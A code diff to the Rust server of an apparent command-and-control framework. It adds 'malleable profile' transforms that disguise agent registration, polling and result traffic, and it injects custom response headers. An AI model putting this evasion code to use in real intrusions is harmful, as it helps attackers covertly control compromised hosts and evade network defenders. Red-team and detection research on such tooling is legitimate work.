@@ -9,7 +9,7 @@ use axum::{
 };
 use serde::Deserialize;
 
-use cloakcat_protocol::{FileChunk, SocksListenerView, TaskType, TunnelData};
+use cloakcat_protocol::{FileChunk, PollResponse, SocksListenerView, TaskType, TunnelData};
 
 
 use crate::error::ServerError;
@@ -83,6 +83,71 @@ pub struct TagsPayload {
     pub tags: Vec<String>,
 }
 
+// ========== Malleable transform helpers ==========
+
+/// Decode a raw request body using the active malleable profile's POST transform.
+/// Falls back to plain JSON parsing when no transform is active.
+fn decode_body<T: serde::de::DeserializeOwned>(
+    state: &AppState,
+    bytes: &Bytes,
+) -> Result<T, ServerError> {
+    let raw: Vec<u8> = match &state.malleable_profile {
+        Some(profile) if !profile.http_post.client.output.is_identity() => {
+            let s = std::str::from_utf8(bytes)
+                .map_err(|_| ServerError::BadRequest("request body is not valid UTF-8".into()))?;
+            profile
+                .decode_post_body(s)
+                .map_err(|e| ServerError::BadRequest(format!("body transform failed: {e}")))?
+        }
+        _ => bytes.to_vec(),
+    };
+    serde_json::from_slice(&raw)
+        .map_err(|e| ServerError::BadRequest(format!("JSON parse failed: {e}")))
+}
+
+/// Encode a poll response using the active malleable profile's GET server transform.
+/// Returns a plain `axum::response::Response` so the caller can return it directly.
+fn encode_poll(state: &AppState, resp: &PollResponse) -> axum::response::Response {
+    let json = match serde_json::to_vec(resp) {
+        Ok(j) => j,
+        Err(e) => {
+            return (
+                StatusCode::INTERNAL_SERVER_ERROR,
+                Json(serde_json::json!({"status": "serialize_error", "detail": e.to_string()})),
+            )
+                .into_response();
+        }
+    };
+
+    if let Some(profile) = &state.malleable_profile {
+        let transform = &profile.http_get.server.output;
+        if !transform.is_identity() {
+            match transform.encode(&json) {
+                Ok(encoded) => {
+                    let mut builder = axum::http::Response::builder()
+                        .status(StatusCode::OK)
+                        .header("Content-Type", "text/plain");
+                    // Inject any custom server headers from the profile.
+                    for h in &profile.http_get.server.headers {
+                        builder = builder.header(h.name.as_str(), h.value.as_str());
+                    }
+                    if let Ok(response) =
+                        builder.body(axum::body::Body::from(encoded))
+                    {
+                        return response;
+                    }
+                }
+                Err(e) => {
+                    eprintln!("[poll] malleable encode failed: {e}");
+                    // Fall through to plain JSON below.
+                }
+            }
+        }
+    }
+
+    (StatusCode::OK, Json(resp.clone())).into_response()
+}
+
 // ========== Agent routes (X-Agent-Token validated by agent_auth middleware) ==========
 
 pub async fn ping_handler() -> &'static str {
@@ -93,8 +158,10 @@ pub async fn register_handler(
     OriginalUri(uri): OriginalUri,
     headers: HeaderMap,
     State(state): State<AppState>,
-    Json(payload): Json<cloakcat_protocol::RegisterReq>,
+    body: Bytes,
 ) -> Result<Json<serde_json::Value>, ServerError> {
+    let payload: cloakcat_protocol::RegisterReq = decode_body(&state, &body)?;
+
     // If agent already exists, validate profile match
     if let Ok(agent) = service::get_agent(&state, &payload.agent_id).await {
         validate_profile(agent.profile_name.as_deref(), uri.path(), &headers)?;
@@ -116,7 +183,7 @@ pub async fn poll_handler(
 
     let hold = q.hold.unwrap_or(0);
     match service::poll_command(&state, &agent_id, hold).await? {
-        Some(resp) => Ok((StatusCode::OK, Json(resp)).into_response()),
+        Some(resp) => Ok(encode_poll(&state, &resp)),
         None => Ok((StatusCode::NO_CONTENT, Json(serde_json::json!({}))).into_response()),
     }
 }
@@ -126,8 +193,10 @@ pub async fn result_handler(
     OriginalUri(uri): OriginalUri,
     headers: HeaderMap,
     State(state): State<AppState>,
-    Json(req): Json<cloakcat_protocol::ResultReq>,
+    body: Bytes,
 ) -> Result<Json<serde_json::Value>, ServerError> {
+    let req: cloakcat_protocol::ResultReq = decode_body(&state, &body)?;
+
     let agent = service::get_agent(&state, &agent_id).await?;
     validate_profile(agent.profile_name.as_deref(), uri.path(), &headers)?;
 
